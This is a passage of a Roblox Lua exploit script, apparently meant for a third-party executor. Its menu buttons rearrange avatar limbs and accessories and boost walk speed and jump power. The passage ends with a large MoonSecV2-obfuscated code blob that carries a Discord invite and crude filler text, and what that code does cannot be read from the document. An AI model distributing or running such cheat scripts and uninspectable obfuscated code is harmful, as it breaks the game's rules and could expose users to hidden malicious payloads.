game.Players.LocalPlayer.Character.Humanoid.JumpPower = 100

local bike2 = char:FindFirstChild("Bike").Handle
bike2:BreakJoints()

game.RunService.Heartbeat:Connect(function()
    bike2.Velocity = Vector3.new(30,0,0)
bike2.CFrame = char.Torso.CFrame * CFrame.new(0,-1.5,-1) * CFrame.Angles(0,1.6,0)
end)

--Right leg

local plr = game.Players.LocalPlayer
local char = plr.Character

local rleg = char:FindFirstChild("Right Leg")
rleg:BreakJoints()

game.RunService.Heartbeat:Connect(function()
    rleg.Velocity = Vector3.new(30,0,0)
rleg.CFrame = char.Torso.CFrame * CFrame.new(1,-2,-0.3) * CFrame.Angles(0.2,0,0.4)
end)

--Left Leg

local plr = game.Players.LocalPlayer
local char = plr.Character

local lleg = char:FindFirstChild("Left Leg")
lleg:BreakJoints()

game.RunService.Heartbeat:Connect(function()
    lleg.Velocity = Vector3.new(30,0,0)
lleg.CFrame = char.Torso.CFrame * CFrame.new(-1,-2,-0.3) * CFrame.Angles(0.2,0,-0.4)
end)

--Right Arm

local plr = game.Players.LocalPlayer
local char = plr.Character
local Toggle = false

local rarm = char:FindFirstChild("Right Arm")
rarm:BreakJoints()

game.RunService.Heartbeat:Connect(function()
rarm.Velocity = Vector3.new(30,0,0)
plr:GetMouse().KeyDown:Connect(function(KEY)
if KEY == "e" then if Toggle == true then Toggle = false else Toggle = true end end end) 

if Toggle == true then
rarm.CFrame = char.Torso.CFrame * CFrame.new(0.8,0.5,-1) * CFrame.Angles(2,0,-1)
else
rarm.CFrame = char.Torso.CFrame * CFrame.new(1.5,0,-0.1) * CFrame.Angles(0.2,0,0.2)
end end)

--Left Arm

local plr = game.Players.LocalPlayer
local char = plr.Character

local larm = char:FindFirstChild("Left Arm")
larm:BreakJoints()

game.RunService.Heartbeat:Connect(function()
    larm.Velocity = Vector3.new(30,0,0)
larm.CFrame = char.Torso.CFrame * CFrame.new(-1.2,0.3,-0.7) * CFrame.Angles(1.1,0,0.3)
end)


--Drink 

local plr = game.Players.LocalPlayer
local char = plr.Character
local Toggle = false

local drink = char:FindFirstChild("Water Bottle").Handle
drink:BreakJoints()

game.RunService.Heartbeat:Connect(function()
drink.Velocity = Vector3.new(30,0,0)
plr:GetMouse().KeyDown:Connect(function(KEY)
if KEY == "e" then if Toggle == true then Toggle = false else Toggle = true end end end) 

if Toggle == true then
drink.CFrame = char.Torso.CFrame * CFrame.new(0,0.8,-1) * CFrame.Angles(0,0,0)
else
drink.CFrame = char.Torso.CFrame * CFrame.new(1.6,-1,-0.5) * CFrame.Angles(4,0,0)
end end)

--Fire

local plr = game.Players.LocalPlayer
local char = plr.Character

local firemo = char:FindFirstChild("FireMohawk").Handle
firemo:BreakJoints()

game.RunService.Heartbeat:Connect(function()
firemo.Velocity = Vector3.new(30,0,0)
firemo.CFrame = char.Torso.CFrame * CFrame.new(0,-1.5,0) * CFrame.Angles(0,0,0) --Position
end)
  	end    
})

Tab:AddButton({
	Name = "Fat Gamer (R6)",
	Callback = function()
      		print("button pressed")
      		local plr = game.Players.LocalPlayer
local char = plr.Character

local aball = char:FindFirstChild("Space Cop").Handle
aball:BreakJoints()

aball.Mesh:Destroy()

game.RunService.Heartbeat:Connect(function()
aball.Velocity = Vector3.new(30,0,0)
aball.CFrame = char.Torso.CFrame * CFrame.new(0,-0.5,-0.5) 
end)

--Desk

local plr = game.Players.LocalPlayer
local char = plr.Character

local gdesk = char:FindFirstChild("Tech Bro Standing Desk").Handle
gdesk:BreakJoints()


game.RunService.Heartbeat:Connect(function()
gdesk.Velocity = Vector3.new(30,0,0)
gdesk.CFrame = char.Torso.CFrame * CFrame.new(0,-1.5,-2.5) 
end)

--Chair

local plr = game.Players.LocalPlayer
local char = plr.Character

local gchair = char:FindFirstChild("Meshes/CrateAccessory").Handle
gchair:BreakJoints()


game.RunService.Heartbeat:Connect(function()
gchair.Velocity = Vector3.new(30,0,0)
gchair.CFrame = char.Torso.CFrame * CFrame.new(0,-2.7,1) 
end)

--Right Arm

local plr = game.Players.LocalPlayer
local char = plr.Character
local Toggle = false

local rarm = char:FindFirstChild("Right Arm")
rarm:BreakJoints()

game.RunService.Heartbeat:Connect(function()
rarm.Velocity = Vector3.new(30,0,0)
plr:GetMouse().KeyDown:Connect(function(KEY)
if KEY == "e" then if Toggle == true then Toggle = false else Toggle = true end end end) 

if Toggle == true then
rarm.CFrame = char.Torso.CFrame * CFrame.new(1.1,-0.5,-1) * CFrame.Angles(0.7,0,-0.3)
else
rarm.CFrame = char.Torso.CFrame * CFrame.new(1.3,0,-0.5) * CFrame.Angles(0.7,0,-0.2)
end end)

--Left Arm

local plr = game.Players.LocalPlayer
local char = plr.Character
local Toggle = false

local larm = char:FindFirstChild("Left Arm")
larm:BreakJoints()

game.RunService.Heartbeat:Connect(function()
larm.Velocity = Vector3.new(30,0,0)
plr:GetMouse().KeyDown:Connect(function(KEY)
if KEY == "e" then if Toggle == true then Toggle = false else Toggle = true end end end) 

if Toggle == true then
larm.CFrame = char.Torso.CFrame * CFrame.new(-1.3,0,-0.5) * CFrame.Angles(0.7,0,0.2)
else
larm.CFrame = char.Torso.CFrame * CFrame.new(-1.1,-0.5,-1) * CFrame.Angles(0.7,0,0.3)
end end)

--Right Leg

local plr = game.Players.LocalPlayer
local char = plr.Character

local rleg = char:FindFirstChild("Right Leg")
rleg:BreakJoints()

rleg.Mesh:Destroy()

game.RunService.Heartbeat:Connect(function()
rleg.Velocity = Vector3.new(30,0,0)
rleg.CFrame = char.Torso.CFrame * CFrame.new(0,-200,0) 
end)

--Left Leg

local plr = game.Players.LocalPlayer
local char = plr.Character

local lleg = char:FindFirstChild("Left Leg")
lleg:BreakJoints()

lleg.Mesh:Destroy()

game.RunService.Heartbeat:Connect(function()
lleg.Velocity = Vector3.new(30,0,0)
lleg.CFrame = char.Torso.CFrame * CFrame.new(0,-200,0) 
end)
  	end    
})

Tab:AddButton({
	Name = "Book Zen (R6)",
	Callback = function()
      		print("button pressed")
      		local plr = game.Players.LocalPlayer
local char = plr.Character

local Hat = char:FindFirstChild("Magic Book (Black)").Handle
Hat:BreakJoints()

game.RunService.Heartbeat:Connect(function()
Hat.Velocity = Vector3.new(0,0,0)
Hat.CFrame = char.Torso.CFrame * CFrame.new(0,0.8,-1.6) * CFrame.Angles(0,1.6,0) --Position
end)

--rigt leg

local plr = game.Players.LocalPlayer
local char = plr.Character

local rleg = char:FindFirstChild("Right Leg")
rleg:BreakJoints()

game.RunService.Heartbeat:Connect(function()
rleg.Velocity = Vector3.new(0,0,0)
rleg.CFrame = char.Torso.CFrame * CFrame.new(0.4,-1.5,-0.5) * CFrame.Angles(0.8,0,-0.6) --Position
end)

--left leg

local plr = game.Players.LocalPlayer
local char = plr.Character

local lleg = char:FindFirstChild("Left Leg")
lleg:BreakJoints()

game.RunService.Heartbeat:Connect(function()
lleg.Velocity = Vector3.new(0,0,0)
lleg.CFrame = char.Torso.CFrame * CFrame.new(-0.4,-1.5,-0.5) * CFrame.Angles(0.8,0,0.6) --Position
end)

-- rigt arm

local plr = game.Players.LocalPlayer
local char = plr.Character

local rarm = char:FindFirstChild("Right Arm")
rarm:BreakJoints()

game.RunService.Heartbeat:Connect(function()
rarm.Velocity = Vector3.new(0,0,0)
rarm.CFrame = char.Torso.CFrame * CFrame.new(1.5,1,-0.5) * CFrame.Angles(0,0.6,2) --Position
end)

--left arm

local plr = game.Players.LocalPlayer
local char = plr.Character

local larm = char:FindFirstChild("Left Arm")
larm:BreakJoints()

game.RunService.Heartbeat:Connect(function()
larm.Velocity = Vector3.new(0,0,0)
larm.CFrame = char.Torso.CFrame * CFrame.new(-1.5,1,-0.5) * CFrame.Angles(0,-0.6,-2) --Position
end)
  	end    
})

Tab:AddButton({
	Name = "Banzai Bazooka Wheelchair (R6)",
	Callback = function()
      		print("button pressed")
      		


local plr = game.Players.LocalPlayer
local char = plr.Character

game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 75

local rarm = char:FindFirstChild("Right Arm")
rarm:BreakJoints()

game.RunService.Heartbeat:Connect(function()
    rarm.Velocity = Vector3.new(30,0,0)
rarm.CFrame = char.Torso.CFrame * CFrame.new(1.5,0.5,-0.5) * CFrame.Angles(1.7,0,0)
end)

--Bazooka

local plr = game.Players.LocalPlayer
local char = plr.Character

local bazooka = char:FindFirstChild("Back Attack Missle Launcher").Handle
bazooka:BreakJoints()

game.RunService.Heartbeat:Connect(function()
bazooka.Velocity = Vector3.new(30,0,0)
bazooka.CFrame = char.Torso.CFrame * CFrame.new(1.4,1.4,-0.5) * CFrame.Angles(0.8,-1.5,0) --Position
end)

--Left Arm

local plr = game.Players.LocalPlayer
local char = plr.Character

local larm = char:FindFirstChild("Left Arm")
larm:BreakJoints()

game.RunService.Heartbeat:Connect(function()
    larm.Velocity = Vector3.new(30,0,0)
larm.CFrame = char.Torso.CFrame * CFrame.new(-1.6,0,-0.3) * CFrame.Angles(0.3,0,-0.1)
end)


--Wheelchair

local plr = game.Players.LocalPlayer
local char = plr.Character

local wheelchair = char:FindFirstChild("Wheel ChairAccessory").Handle
wheelchair:BreakJoints()

game.RunService.Heartbeat:Connect(function()
wheelchair.Velocity = Vector3.new(30,0,0)
wheelchair.CFrame = char.Torso.CFrame * CFrame.new(0,-1.2,0) * CFrame.Angles(0,0,0) --Position
end)


--Left Leg

local plr = game.Players.LocalPlayer
local char = plr.Character

local lleg = char:FindFirstChild("Left Leg")
lleg:BreakJoints()

game.RunService.Heartbeat:Connect(function()
    lleg.Velocity = Vector3.new(30,0,0)
lleg.CFrame = char.Torso.CFrame * CFrame.new(-1.5,-200,0) * CFrame.Angles(0.7,0,0)
end)

--Right Leg

local plr = game.Players.LocalPlayer
local char = plr.Character

local rleg = char:FindFirstChild("Right Leg")
rleg:BreakJoints()

game.RunService.Heartbeat:Connect(function()
    rleg.Velocity = Vector3.new(30,0,0)
rleg.CFrame = char.Torso.CFrame * CFrame.new(-1.5,-200,0) * CFrame.Angles(0.7,0,0)
end)


_, Protected_by_MoonSecV2, Discord = 'discord.gg/gQEH2uZxUk'


,nil,nil;(function() _msec=(function(e,l,o)local Q=l["ټكحآزټحضنزسك"];local J=o[e[(0x17327/155)]][e["زجددؠ؃سن؃ضزټز؃ضس"]];local M=(0x98/38)/(-#[[I like gargling cum]]+(1155/((((-0x1e+7393)+-#"This is working now")/0x6c)+-#'me big peepee')))local h=((((233-0x84)+-#"no thanks")-57)+-33)-((1060/0x6a)+-#'no thanks')local v=o[e[((0x150-204)+-#[[I like gargling cum]])]][e["ڝضقؠس؃حضآنز؃دزسقض"]];local N=((0x348/((0x2a69/77)+-0x39))+-#[[no thanks]])+(23-0x15)local s=o[e[(-0x50+616)]][e["زدآز؃ڪضكؠؠقڪضدس"]]local n=(-#[[me big peepee]]+(-0x17+38))-(89-(((-#"no thanks"+(0x1af-258))+-0x39)+-#"I like gargling cum"))local P=((0x83-((((-#"test 123"+(0x27e24-81708))/252)+-#'Bong')-212))+-#[[This is working now]])local p=(-#'free trojan'+(143-(-#"Bong"+(0x17f-(0x210-(571-0x126))))))local C=(((0xc6309/((((1015-0x224)+-#[[test]])-0x116)+-#'Bong'))/0xc3)+-#[[I like gargling cum]])local m=((((249-((34999+-0x31)/233))+-#"This is working now")-57)+-#"I like gargling cum")local D=(((0x1bf-((-#{(function()return{','}end)(),(function()return{','}end)();",";",";1;{}}+627)-0x14e))/0x14)+-#'Bong')local _=((-0x6d+(-#"I like gargling cum"+(20449/((-56+0x13)+0xb4))))+-#'free trojan')local x=(((0x17ca/(0x105-(-0x7e+317)))-69)+-#"187 ist die gang")local w=(5+-#{26;'}';(function()return#{('bPBLOH'):find("\66")}>0 and 1 or 0 end)})local c=((0x6f+((-29571-(-0x735c0/((140-0x63)+-#"no thanks")))/141))+-#"Bong")local t=((0xb1-(120+-#{{},(function()return#{('MbKbKO'):find("\75")}>0 and 1 or 0 end);'nil','}',(function()return{','}end)(),26;","}))-0x3e)local B=(0x54+(-0xbda/(-#{",";54;{};54;",";'nil';1}+44)))local r=((((((-0xf99d8/104)+-#[[test123]])+4897)/61)+0x57)+-#'test')local b=((119+-#{",";'nil','nil'})-113)local k=((0xc1+(7+((-5456/0x3e)+-#'no thanks')))-0x64)local f=(-#{26,'nil';'nil';(function()return{','}end)();'}',",",'nil'}+10)local U=(0x2f-(((-#'I like gargling cum'+(546040/0x28))/0x60)+-0x62))local O=(0x36-(55+-#{21,{};'}';(function()return{','}end)()}))local g=(0x7c+((((-0x1151a8+-78)+-#"test123")/0x3b)/159))local G=e[(1338+-#{24;'nil';24;1,{},(function()return#{('OFmBFO'):find("\109")}>0 and 1 or 0 end)})];local H=o[e[((0x17d-252)+-#"187 ist die gang")]][e["ڪقحجڪدؠڝ"]];local A=o[(function(e)return type(e):sub(1,1)..'\101\116'end)('آئڪضزدټد')..'\109\101'..('\116\97'or'ززضجقححك')..e[((92853/0xab)+-#[[test123]])]];local K=o[e[((0x47b-595)+-#[[187 ist die gang]])]][e["ڝټجزآڝحكجئ"]];local I=(0x116/139)-(((-#'test 123'+(((-0x66f/61)+0x104)-0x7d))-85)+-#"amena jumping")local j=((-24+(((-163+0x46)+143)+-#"free trojan"))+-#'amena jumping')-(90/0x2d)local L=o[e[(-#{1,'}';163;1,(function()return{','}end)();163}+119)]][e["ض؃كحڝڝدجئجؠضڪئڪضس"]];local a=function(o,e)return o..e end local T=(-#{31;{};75}+7)*(((-#[[free trojan]]+((349+-0x70)-0x95))+-64)+-#'no thanks')local y=o[e["ڝزقئڪڝزڝجقكسض"]];local d=(0x168/180)*(0x153-(((0x101efe/91)/0x36)+-#'test'))local F=(173056/0xa9)*(-#"test123"+(((-0x65+1729)+-62)/174))local z=((((398880/0x3c)+-31)+-#"amena jumping")/0x7f)local S=((((0x3be-511)-0x108)+-68)+-0x71)*(436/0xda)local u=o[e["ؠټڪزقڝڪحؠؠټضئڝكټقض"]]or o[e[(0x467-591)]][e["ؠټڪزقڝڪحؠؠټضئڝكټقض"]];local i=(533-((0xda88/(-122+0x137))+-#'I like gargling cum'))local e=o[e["ققجض؃زدجآن"]];local K=(function(a)local r,l=2,0x10 local o={j={},v={}}local d=-n local e=l+h while true do o[a:sub(e,(function()e=r+e return e-h end)())]=(function()d=d+n return d end)()if d==(T-n)then d=""l=I break end end local d=#a while e<d+h do o.v[l]=a:sub(e,(function()e=r+e return e-h end)())l=l+n if l%M==I then l=j K(o.j,(L((o[o.v[j]]*T)+o[o.v[n]])))end end return s(o.j)end)("..:::MoonSec::..؃دحجئضسزقكنؠآټڪڝكنئټڝحكزجڪڪنقسحؠټ؃آضقسح؃ټټسڪح؃كنسټ؃سقؠڝحقآجدټسسحټټدؠسحؠزڪدضدكسڪسجزقدكئجؠټآقدحسدجټضزسدڪئكددنكئڪڝجقكڝدئدقجؠټدآسقنټ؃؃ئڪك؃ڪكجئكآنزئجڪققټنكجآټڪقكجضټنزؠڝڪكڪزئنآئكڪڪكجقؠئحڝسزنحڝڪ؃ققح؃آ؃دحننئڝڝئكدڝڪئسقضآؠدقسضقڪ؃ضئټكؠڪكڝضڝڪنجئئڪكقڪحآققڪسحټكقزحددؠسضؠئددحؠكسئ؃حنټضدقجحقآټزحدزؠآننآسئڪضنڝضكنجڝئټڝآكنجسڪئقآجضټآزڪدسزد؃ضن؃ئضڪنقسڝئجقسقآضدټسآننڪڝجآؠؠنڝئؠڝ؃كضؠدئڪڝسكئئدڪجزكح؃آزكحنټححڝنكؠئ؃ڪضټنك؃ئسڪټححآڝسق؃ټؠحئڝنآڝڪئحقؠڪزحززقآحڪدضكنټآڝؠټضټ؃حنزججنقڝسجضقققزجدآڝزئدك؃دآآزآدسآآضآ؃نحكڪؠقؠج؃ټضآ؃قڪجسآآزجڪجضڝڝټنحئزئحڝسككئڝڪڝكزڝټئحدټؠكضڪ؃جندڝټضؠنحآضحضزدؠڝددټضدڪؠڝسئ؃كآنڝڝضحنقڝآڪټقآجدټسآققڝججټضزئحټڪض؃حنجئقڪټڝككقئكڪسد؃ټ؃ز؃دضؠنضئؠق؃ڪئقكقټڝئ؃ڪحقزحآجحڪسقئئآز؃؃ننڝضئجن؃حؠ؃ضدڝؠقئجآڪكك؃جنټ؃ڝنؠنضنڝڝنئجئنؠڪضجآزڝسنجحآآزددس؃زآضسس؃ڪؠئسسڝؠنټئئڝنكد؃؃ضسضڝنؠحضټززآجدجكدسضجڪكقڪججآټحكقضټحدحضزنؠڪڝدنقټټئحنزضؠد؃ككڪحڝآټزحدزؠددقضقؠؠڝسئسقنضنڪڪقكحڪټجز؃ټآدئز؃ؠټڝكضدزدڪنحكزقكسجئټكزڪدزققټحدضضټنټڪڝس؃ضزڝ؃كضجنح؃ڪققټدجڪؠقآحڝآجئن؃ټآئضڪڪئئزڪضقنحڝآكج؃ز؃ټج؃نسحنڪئد؃ڝندئسڪؠكقڪقحآققآح؃ڝسؠنزڝڝڝقكدټټحټحئؠض؃كضنكڪټڝنحزڝدكؠڪسجڝكسزنسڪڝئضزئټؠدؠزڪؠض؃ټجقآقسك؃ڪؠجآآسس؃ڝنآكدكزجسټؠق؃حئضڪآڪ؃ڝضؠؠكټئنڝئټڝحكززڝض؃ڝقك؃دزڪنقجزكسض؃كنڪضجسقآڝئسڪزقآجدڪججؠزقآدححقنآق؃زئضقئآحزدټدآضڪحقدحسآؠسؠآڝدزسؠنڪڝدق؃؃دكقجټڪحزجڪسجسزضؠكد؃ئدكڪڝدجقزآټئدآضڝڪټجټټززآحدؠحدؠزضقڝڝڝئؠككټآجضزجآزق؃قنحزآآزدضكدآآآزد؃آؠ؃ضز؃ئؠضڝقققحټټحز؃ڪ؃حضسنسقڝكئټكؠكئجئزټؠڪ؃ڪضحضزنحڪټجزكآآټحدضټنضجئڝحكئجكټڪكسټقجضڪكدؠؠآسد؃سؠزڝآضجكسئجڪنقكحڪټجسحآڪدكسجنآ؃قكڝ؃؃ن؃ئضڪننزڪڝحؠقآآڪجؠ؃زنؠض؃ڝضكنجڝجئحڝحدئحټڝقئحكدزڪدقؠجدآجزض؃ڝؠسسټنحئ؃ڪضقنحزقئټڪڝقسڝؠټڝؠحزضڝڝآندئسجج؃ضنحجؠڪټكججحټحڝټؠټضټ؃حنزسضكټڪكجڪقحڪججدآڝزئدكحسټززآدټقآحسآؠحؠڝټقؠج؃ټضكدآآحټسدؠڪ؃كئسن؃ڪ؃حسئزقزټححضسڝؠضڝڝئټكڪڪدجدززآدنټڝټكزجآڪدسټڪؠجضق؃آسد؃دڪزآڝحئضقزؠقئسڪزقآجدآجحؠزحآ؃؃ڝح؃ؠئضكڝڪؠؠڝقضحكدټټحجسڪؠن؃ڪضؠنقڝ؃جآزآټئحدزدكآئئڪحقزحآؠؠحڝسټؠك؃ڪضحكآڪح؃جكڪئجڪققسڪحئ؃قزنددقس؃نڪڝآ؃قڝڝنئئكڪڪكججقټټكڪسزڝڪزسدسؠؠس؃دنضسنكڝټئكڝنڪټققحټټحسجآآحسض؃نټ؃ضضئكحټزحئززكئججټقزټدززجآڝ؃ټسدؠحدكؠسئنڪڝكئقؠئجڝجكئجسټضزقج؃آسسنڝڪآئسئ؃آن؃ئؠڪڪڝڝټټزقدټآحؠحزضدئآدئؠ؃آنسسجڝئنسننققحجآقسټسضحآآڪسز؃زنڪضضټآنڝئقآټججآڪزجدقؠضدسسضؠقڝنجنكقټقحكزجقټټقزكدڪآجؠحق؃حدآضدضنئئسڪؠك؃قدجڝڪسجڝآڪسڪدجؠقزحؠڝ؃دضدنحكقجټڪ؃قضحنجڪڪز؃دآدسج؃قنټكزئنڪآڝټڪڪقؠج؃ټضكجټكحقزئؠټڝڝئڝكجزضئڝڪآكدجسآكجكقكټض؃ټسضنضڝحڪكنقئټڝحكزجآڪدؠحسؠحآڝسحآټڪكجڝ؃ټضدججټدئئؠڪزقآجدآؠجحزحټض؃آسئقئڝټجآټضئټڪټكحجزټئجكقسآټدحدكآكضڝ؃ئنكجضنټڝؠجققئټآ؃قسكآضڝؠجدكضڪڝحززكڝټنضئجڪققټدققسټآحنزدؠجڝڪسټضنڝڝنئئكڪڪكججقټټقسحڝآآزددسؠضڝئجكؠ؃ڝڪئضقزټڝڝڪكقحټټحزز؃جسټؠن؃ټضئننڝحئجقزآقڝحسكؠدڝڝئټضكحسدضؠسضؠ؃؃ڪقنؠسحڝآنڪڪحقجحقآټؠڪزآححټضڝ؃آدض؃ڝضكنجقكئڝحجكسجآڝدقس؃نزڪآحسقڝآكحدزدؠكڝضضدقڝڪجحجقئحضدحؠزضآ؃دنسحؠضڝټضڝسڪسقئحكآڪزڪټضدټسسكسټسدآضسؠدئ؃ڪضقندسق؃آټح؃سزؠټ؃ضضسكنټؠدسزڝؠكددسدنكڪضئدزڝټجدجزئڪز؃حنزئآڝدكسجؠآ؃آئؠقټضزئدكؠڪضؠؠسد؃ضحنئڝجڪئڪڝقؠج؃ټضؠټقزحضټؠسڝدسآآسحدئئكڝئكدجسټؠآحكئحڪڪقضؠجحټ؃زحآدضؠڝحكزجآئقڪزكقجضڪقزڝحټټزسڪټټؠؠسآددؠحدضقآجدټسزؠح؃آضزحئڝقجضكڝڪنجئقڪټكحدزكؠسؠجحآؠز؃دضنددجسدنآڪټئضقحټڪدؠئكآح؃دؠڝحضآ؃سض؃نؠجڝڪضټكنڪجئ؃ققآسددسقجنآڝسؠد؃ؠضؠدسڪدسؠئسد؃جككئ؃ڪزؠضټدزددسؠؠضحؠڝڝڝئؠكټضضئضڪجققحټآنجدقحآس؃زجزكټجټ؃سكڝئئڪكڪحنضئدڪئقكحآټڪضسحآآ؃سڪدكننڝئكئجكټڪسآټقحدسنآ؃جدسس؃سنؠض؃جق؃سنڪضؠڝزقآټؠزقدټآحنكزؠدضآڝئحدكؠزضك؃ئئجټكزڪحج؃كټدزسڝآټحسسدئؠڝجقڝسنقئجڝ؃قڪئ؃نضح؃ؠټسح؃زكجڝټضنكزآټحكقضټحسحقددڪآجسقڝؠسؠؠآ؃ضئټز؃ڪكحقجكټڝزڝحئآكضقټئ؃ڪسحؠجكدئڝڝدكسجؠآڪئجضآزئزكدكؠڪسجڝئضكؠ؃ڝجئآؠقڪڪقؠج؃ټضزحټندسزحؠس؃حئسكڝنئئؠڪآكدجسئحڪدكححڝڝكدئؠكضڪ؃جنقئټڪحټسقدڪدقسحؠټ؃زضدنؠڝنئجكؠجضجڝقكټقنضسڝنكسئڝ؃زحڪآضسن؃ڝ؃حؠڪزضدزؠزضؠ؃ضنسئحڝضز؃دڪؠڝسجزحضڝ؃ئنكئڪڝجدقزڝححددحآټدزسدؠآ؃سضټنسڪجآ؃حكڪئجڪقآڝندجؠڝضسزجضټټزجدنزض؃ڝنئئكڪڪزكڪڝجزق؃ټحڝڪسآنڪڝضئككنټحج؃ز؃آد؃ؠضنكئحټټحزز؃جزؠآك؃سضحننآسجټقضټجحدحټآحكئححآزسآڝآز؃ؠق؃جضدنئنضدضزجؠندحضقنزنضدآقنآزدضسضؠضڝك؃ؠضسز؃كححڪټجزقق؃حنآقزڪدحؠكسڝ؃ضؠززئدئحئڝزؠڪ؃ئئحڝدضدڝڪضټ؃دنسئؠضڝزڝئزټڝقئحكآضحجززؠق؃ئضآققڝئج؃قسټدددضؠټئڪدزكدڪآجض؃ؠكد؃ضجنؠڪضححقڝآزدنس؃نك؃ضسڪزجدجؠقضټڝآجسنسڝض؃ضجڝڪسقضحنآڝضآټجدؠسكؠزآجآزڝآكآئدڪسټقكڝئجټڝكقڝسزج؃ڪؠجضقڝضسحننڪكحڝزآآكڝسسڝنڪقندؠؠكضڪ؃جنج؃دضسكزټؠج؃زئقؠټضزضدنؠڝئآآ؃؃ڪضقكنآڝئنڪزقآجدڪڝ؃آضئآحڝسسنكحڝسؠقنكئقڪټكحننئئڪحقنجنڪزؠقآجضڝ؃ئنكك؃سحڝآؠسحقڝسكڪجئټؠؠڪآضسض؃ننڝنكجټ؃زؠ؃دنټسجسټززآحدڪححقسحؠآضڪ؃كنئئكڪڪزكڝضجدقدآټحضضؠنزڝآئ؃نننڝئڝڝئككجسكټڪڪجحزجنزحدآدسس؃ؠ؃حؠڪسد؃زؠققڪكؠججټقزټ؃كزؠآؠ؃آضئن؃ڝضجكسئڪ؃دنسڪؠڝڪججسآټزحدزنندڝجؠنز؃؃جؠققټآدټسضؠټ؃ڪجئكسكضز؃؃آؠدضس؃جضننقڝ؃ئدقؠآؠدؠضټڪجقئدحؠزضآڝجضحؠئڝ؃جڝكحټض؃سسزؠس؃كئؠقؠڪكحكزنآئڝجئټكؠڪؠئحقؠززكددڪآجسقزټدجآنز؃؃سنقضئڝڪسججټڪڪكدڝقڪ؃زئحڝقآززڝحزڝحقټآنضحضڪضجضآڝزئدكؠزدجزدؠقڪسئآقسڪ؃حؠسؠؠضنسق؃دڝآئسكس؃دقآضسآدسنآڝ؃ككجسټؠق؃ددزنټئڝقسضؠسڝڝجآزڝڝڝكزجآڪدسڪڪؠججزڪؠآد؃سدزؠڪئجؠزڪټسد؃دزك؃جدټسزؠسقحنآؠزجضزضنڝڪنجئقضنآ؃ڝقحزؠزسضئض؃نټضڝكټس؃آنكئڪڝجقضڝټئ؃زڝټزحجسقنڪڝحزد؃ننڝضئڝضئنكټڝجد؃قئټحڪڪضڪننڝقجؠؠكسئڝڝنئئكټكئټكؠټزحئض؃ؠڪ؃ضضزكنجد؃قننئڝڝئټنقڪحآسڪس؃؃ضننئڝڝئككټڪڪڝز؃؃ئكڝئئڪكقزڪجئدققؠح؃ټضسنآڝ؃جنزضنكئنڪڝكئقدئجڪئقآضكزټدزؠآسدسكدجؠضضق؃ضنحئضڝضكنجقڪنڝ؃آزسز؃آؠدسؠنكڝحئقكجززجآټكزڪحجد؃ڪدقسحزنآز؃دكؠڝسزكڪجنټڝقئددقضآضححسټكجڝدئققؠسؠنسئ؃ڪضقنكؠجكټنقححقټنق؃حسؠقز؃دئنسڝنك؃جضټنقضټؠحجسآؠڪؠؠضئن؃ڝ؃ڪززقآآدټسدنحؠسټحزئدكؠڪټدسټحئكؠڝټكآئدڪسزقڪ؃حززټټ؃؃ڝټآ؃ڪؠجضقڝټنحححڪسټدنټټڝق؃حضآنسزآقحئضنڪټؠؠئټڝحكزججكدڪنحزقدكندقسحنټڝججټضټآسدآسزنقڝحجڝكحټؠحزآضسن؃ڝكټ؃كسحنڪڝزجڝكئآضڪئقدحسآؠسكآضحجسنكئڝضضدقزآقئقڪحقزحآدټڪضزڪحدټدضندؠؠضزح؃جؠضټحكججحټززآحڝزڝآڝ؃آسئؠدټحنؠئكڪڪكجح؃ك؃ټئحآز؃ؠك؃ججحسك؃ضننئڝڪآئزندټڝحنزڪنحدؠضنسئسؠ؃ؠؠ؃ضضئټ؃حؠجضؠڝجكجټڝزټححآزسزآد؃نسسنآڝن؃سزټن؃جكټڪقج؃ڝقزآزحزئكؠج؃حئجككټكحنزئز؃كححڪټجزقكئحجټجززحئآسس؃؃ضنكؠؠنججئټكزڪزسحټڪدسححكآضسڪ؃زؠټسكڪضكؠضدڝقسآدئڪضزكحنآزننؠجضدڝسكؠنئئڪڝټكحئجڪؠقحزڝسڝ؃ټؠحضزڪئضؠنضڝ؃جحزؠټزنڝحقآكسڪدجحقؠڪزئدؠآدڝحكسجؠڪ؃آكڝؠټقزئدكؠڪؠ؃سكدئآ؃س؃د؃ؠسئنڝ؃؃جټڪزندڝآئسضآقدسضننټڝضجدزڪآؠجنټڝق؃حضآنزنآقدقضكؠڝنڝئټڝحكزحضكضڪټحؠزدؠټدضكحزح؃كنڪضج؃ټئكنضڝحڪكقحآڪدڪدضنسڝنئؠقڝټ؃ؠننڝئقڪټكححؠقسؠئححزقآنڝزجققڪآدحؠضؠحجن؃جټڪحقزقڪجنڪنئكححټټزكحدآك؃ئكڪئجڪقټ؃كؠئؠڪضكؠحؠټكقجدټآجسڝؠټئڪڪڪكججقح؃ڪنقآجڝڪضضټآضس؃؃ضننككسز؃قنآحزڪټك؃ئدټؠقدسسزح؃ؠؠ؃ضضڝجضآكسڪڪجڪقسآحدڪضآؠ؃ڝ؃ضدقضضؠ؃؃نضئنكحزضڪندڝڪجحآآټزحدزنسدنسآنڝ؃نڝؠكنجڝڪئټككنجئڝدقحجئسؠدآؠدضسڝؠكقڝكئقكؠټټدټزؠؠؠ؃آضسقضټڝحټزټټئدټڝحكڪجنټڝقئك؃حڝڪ؃زټج؃آززضدڝؠسجټنضئ؃ڪضقنزسجكڪټزدحقټنقجدؠؠنسددقضجڪؠك؃جضآ؃جسزڪآزدكئسؠ؃ڝڝئ؃كسټسحززدقحڪققضحنآڝآززآج؃آقزسڝئآزس؃سڝئضڪسقؠج؃ڪنجدزدټئسټدزؠجضقڝټقك؃زضدكآڪححآجننك؃ڝزجحكؠكضڪ؃جؠد؃دضسكدڪقجسزجقق؃آضزسنڪټححسدنڝڪئزحنح؃ؠججكئؠڝټڪزؠح؃آضضڝآكدقضكنڝڪڝئ؃قنڝ؃جقټآقدحسدؠڪضدسؠنضڝ؃ئ؃قسضڝجكقجټڪحقزحآندؠضك؃آڝسض؃ننڝؠقسآ؃ئسجضد؃؃ضحجڝټټكجججټززضحقآټزسنقئكڪڪكجحجكزڪدجحؠسزضدسؠؠس؃ڝ؃ضڪؠحڝ؃ضجئئڪجققحټئنڪززڝححټحززټڪضضڝنكڝئئڪكقڪئكدقنټحكآزسآدددآآټسڝدحكآجسټسق؃ڪدقجحقآټؠكزآج؃ئز؃سنؠض؃ڝضكنجڝڝئآكنجټنزقدټآحنڝق؃حضآسئح؃ضؠكنسكججئټكزڪ؃ؠقحآح؃ڪ؃؃س؃؃دنسئؠ؃حئدكڝټڪحكئ؃آڪزجدقټئ؃ڝز؃نئ؃دئآقكڪجحجسكق